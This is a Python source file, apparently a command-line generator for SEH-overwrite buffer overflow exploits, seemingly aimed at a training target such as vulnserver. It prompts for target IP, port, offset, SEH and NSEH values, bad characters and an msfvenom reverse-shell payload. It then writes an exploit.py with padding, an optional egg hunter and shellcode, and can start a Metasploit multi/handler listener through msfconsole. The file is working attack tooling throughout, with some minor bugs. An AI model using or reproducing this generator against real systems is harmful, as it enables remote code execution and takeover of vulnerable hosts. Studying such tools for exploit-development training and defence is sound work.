import sys
import os
import time
from datetime import datetime
from exploit.seh.footer import footer_crash
from exploit.seh.footer import footer_nocrash
from exploit.seh.header import header
from egg.egg_hunter_gen import egg_hunter_gen

date = datetime.now()


def nseh_print():
    print("To Find the Jump Back Value Or\n"
          "NSEH Value this is the Formula\n"
          "32 + 2 + (any value)\n"
          "Note That the ANY VALUE should not be greater than the\n"
          "OFFSET when added and use that value to find the NSEH\n"
          "\n To Find the NSEH Value Add everything then start up\n"
          "EXAMPLE: 32 + 2 + 6 = 40  so "
          "msf-nasm_shell\n\n"
          "> jmp -40\n"
          "> EBD6\n"
          "Since it is Just only 2 values EB and D6 We are going to add\n"
          "9090 to be 4 values")


def print_help():
    print("To Generate a Exploit for SEH Buffer Overflow\n"
          "python3 seh.py exploit create")
    print("For help in exploit creating\n"
          "python3 seh.py exploit --help or -h")


def print_help_exploit():
    print("For The Crasher")
    print("Example For Crasher in Vulnerable server\n"
          "You Need To Type in GMON /.:/\n"
          "and For the OPTION Y OR N ONLY")
    print("To Generate A Exploit\n")
    print("You Need to Know the\n"
          "1. Offset\n"
          "2. NSEH Value(If Jump Back is Needed input the value)\n"
          "else just input BBBB\n"
          "2. SEH Value\n"
          "3. Bad Characters\n")
    print("\n\nWhen Generating Shellcode\n"
          "You Need to Use 'shellcode' as header in msfvenom use '-v shellcode'\n"
          "For Payloads Please Refer to\n"
          "https://medium.com/@hannahsuarez/full-list-of-546-msfvenom-payloads-39adb4d793c9"
          "\n\n"
          "For Inputting Shellcode just copy and Paste then to end it\n"
          "\nLinux = control-D and for Windows = control-D\n\n")


if sys.argv[1] in ['-h', '--help']:
    print_help()

if sys.argv[1] == "exploit":
    if sys.argv[2] in ['-h', '--help']:
        print_help_exploit()
        sys.exit(0)
    elif sys.argv[2] == "create":
        option_crash = str(input("Do You have a Crasher(Y or N)): "))
        if option_crash in ['y', 'Y']:
            # User Input
            crasher = str(input("Crasher: "))
            ip = str(input("Target IP: "))
            port = int(input("Target Port: "))
            offset = int(input("Offset: "))
            seh = str(input("SEH Value(add 0x): "))
            bad_character = str(input("Input the Bad Characters(ex. \x00):"))
            payload = str(input("Please Enter Payload: "))
            LHOST = str(input("Your IP ADDRESS:"))
            LPORT = int(input("Your Port: "))
            option_egg_hunter = str(input("Do you need a Egg Hunter?(Y or N): "))


            # init header and footer
            head = header(ip, port)
            foot = footer_crash(crasher)

            if option_egg_hunter in ['y', 'Y']:
                nseh_print()
                nseh = str(input("NSEH Value: "))
                nseh_val = int(input("How many Did you Minus(32 + 2 + 'VALUE'): "))
                egg_hunter = str(input(input("4 Letter Value: ")))
                opcode = egg_hunter_gen(egg_hunter)
                
                # 2 string
                egg_hunter = egg_hunter * 2
                
                print("Generate This Payload in Kali Then paste it in Shellcode: msfvenom -p "
                      + payload + " LHOST={0} LPORT={1} ".format(LHOST, LPORT)
                      + '-b "{0}" '.format(bad_character) + "-f python " + "-v shellcode")
                print("Shellcode: ")
                shell = sys.stdin.readlines()
                shell = "".join(shell)
                
                # Generate Exploit
                f = open('exploit.py', 'w+')
                f.write(
                    "" + head + "\n"
                    "" + opcode + "\n"
                    "" + shell + "\n"
                    "egg = {0} + shellcode".format(egg_hunter) + "\n"
                    "\n"
                    "buffer = '\x41' * ({0} - len(egghunter) - len(egg) - {1})".format(offset, nseh_val) + "\n"
                    "buffer += egghunter + '\x41' * {0}".format(nseh_val) + "\n"
                    "buffer += struct.pack('>L', {0})".format(nseh) + "\n"
                    "buffer += struct.pack('<L', {0})".format(seh) + "\n"
                    "buffer += '\x43' * 2000\n"
                    "" + foot + ""
                )
                f.close()
            elif option_egg_hunter in ['n', 'N']:
                print("Generate This Payload in Kali Then paste it in Shellcode: msfvenom -p "
                      + payload + " LHOST={0} LPORT={1} ".format(LHOST, LPORT)
                      + '-b "{0}" '.format(bad_character) + "-f python " + "-v shellcode")
                print("Shellcode: ")
                shell = sys.stdin.readlines()
                shell = "".join(shell)
                nseh = r'\x42\x42\x42\x42'
                # Generate Exploit
                f = open('exploit.py', 'w+')
                f.write(
                    "" + head + "\n"
                    "" + shell + "\n"
                    "\n"
                    "buffer = shellcode"
                    "buffer += '\x41' * ({0} - len(shellcode))".format(offset) + "\n"
                    "buffer += struct.pack('>L', {0})".format(nseh) + "\n"
                    "buffer += struct.pack('<L', {0})".format(seh) + "\n"
                    "buffer += '\x43' * 2000\n"
                    "" + foot + ""
                )
                f.close()
            else:
                print("Enter a Valid Option")
                sys.exit(0)
                
        elif option_crash in ['n', 'N']:
            ip = str(input("Target IP: "))
            port = int(input("Target Port: "))
            offset = int(input("Offset: "))
            seh = str(input("SEH Value(add 0x): "))
            bad_character = str(input("Input the Bad Characters(ex. \x00):"))
            payload = str(input("Please Enter Payload: "))
            LHOST = str(input("Your IP ADDRESS:"))
            LPORT = int(input("Your Port: "))
            option_egg_hunter = str(input("Do you need a Egg Hunter?(Y or N): "))


            # init header and footer
            head = header(ip, port)
            foot = footer_nocrash()

            if option_egg_hunter in ['y', 'Y']:
                nseh_print()
                nseh = str(input("NSEH Value: "))
                nseh_val = int(input("How many Did you Minus(32 + 2 + 'VALUE'): "))
                egg_hunter = str(input(input("4 Letter Value: ")))
                opcode = egg_hunter_gen(egg_hunter)
                
                # 2 string
                egg_hunter = egg_hunter * 2
                
                print("Generate This Payload in Kali Then paste it in Shellcode: msfvenom -p "
                      + payload + " LHOST={0} LPORT={1} ".format(LHOST, LPORT)
                      + '-b "{0}" '.format(bad_character) + "-f python " + "-v shellcode")
                print("Shellcode: ")
                shell = sys.stdin.readlines()
                shell = "".join(shell)
                
                # Generate Exploit
                f = open('exploit.py', 'w+')
                f.write(
                    "" + head + "\n"
                    "" + opcode + "\n"
                    "" + shell + "\n"
                    "egg = {0} + shellcode".format(egg_hunter) + "\n"
                    "\n"
                    "buffer = '\x41' * ({0} - len(egghunter) - len(egg) - {1})".format(offset, nseh_val) + "\n"
                    "buffer += egghunter + '\x41' * {0}".format(nseh_val) + "\n"
                    "buffer += struct.pack('>L', {0})".format(nseh) + "\n"
                    "buffer += struct.pack('<L', {0})".format(seh) + "\n"
                    "buffer += '\x43' * 2000\n"
                    "" + foot + ""
                )
                f.close()
                print("exploit.py has been generated")
                start_msf = str(input("Do you want to Start Metasploit? (Y or N): "))
                if start_msf in ['y', 'Y']:
                    f = open('msf.rc', 'w+')
                    f.write(
                    "use exploit/multi/handler\n"
                    "set payload {0}".format(payload) + '\n'
                    "set LHOST {0}".format(LHOST) + '\n'
                    "set LPORT {0}".format(LPORT) + '\n'
                    "set EXITONSESSION false\n"
                    "exploit -j"
                    )
                    f.close()
                    time.sleep(1)
                    os.system('msfconsole -r msf.rc')
                elif start_msf in ['y', 'Y']:
                    print("Thank you For Using")
                    sys.exit(0)
                else:
                    sys.exit(0)
            elif option_egg_hunter in ['n', 'N']:
                print("Generate This Payload in Kali Then paste it in Shellcode: msfvenom -p "
                      + payload + " LHOST={0} LPORT={1} ".format(LHOST, LPORT)
                      + '-b "{0}" '.format(bad_character) + "-f python " + "-v shellcode")
                print("Shellcode: ")
                shell = sys.stdin.readlines()
                shell = "".join(shell)
                nseh = r'\x42\x42\x42\x42'
                # Generate Exploit
                f = open('exploit.py', 'w+')
                f.write(
                    "" + head + "\n"
                    "" + shell + "\n"
                    "\n"
                    "buffer = shellcode"
                    "buffer += '\x41' * ({0} - len(shellcode))".format(offset) + "\n"
                    "buffer += struct.pack('>L', {0})".format(nseh) + "\n"
                    "buffer += struct.pack('<L', {0})".format(seh) + "\n"
                    "buffer += '\x43' * 2000\n"
                    "" + foot + ""
                )
                f.close()
                print("exploit.py has been generated")
                start_msf = str(input("Do you want to Start Metasploit? (Y or N): "))
                if start_msf in ['y', 'Y']:
                    f = open('msf.rc', 'w+')
                    f.write(
                    "use exploit/multi/handler\n"
                    "set payload {0}".format(payload) + '\n'
                    "set LHOST {0}".format(LHOST) + '\n'
                    "set LPORT {0}".format(LPORT) + '\n'
                    "set EXITONSESSION false\n"
                    "exploit -j"
                    )
                    f.close()
                    time.sleep(1)
                    os.system('msfconsole -r msf.rc')
                elif start_msf in ['n', 'N']:
                    print("Thank you For Using")
                    sys.exit(0)
                else:
                    sys.exit(0)
            else:
                print("Enter a Valid Option")
                sys.exit(0)
        else:
            print("Enter a Valid Option")
            sys.exit(0)
    else:
        print("Please Enter a Valid Option")
        sys.exit(0)
else:
    print("Please Enter a Valid Option")
    sys.exit(0)
